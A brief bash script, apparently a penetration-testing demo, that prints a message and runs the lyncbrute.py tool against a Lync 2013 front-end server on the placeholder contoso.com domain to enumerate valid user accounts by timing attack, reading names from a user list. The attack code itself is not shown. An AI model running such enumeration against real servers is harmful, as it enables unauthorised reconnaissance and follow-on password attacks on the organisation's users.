#!/bin/bash

echo "Attempting to enumerate users via timing attack."
echo ""
echo "Command:"
echo "python lyncbrute.py -t 2013-lync-fe.contoso.com -d CONTOSO -i userlist1.txt -o /dev/null"

python lyncbrute.py -t 2013-lync-fe.contoso.com -d CONTOSO -i userlist1.txt -o /dev/null
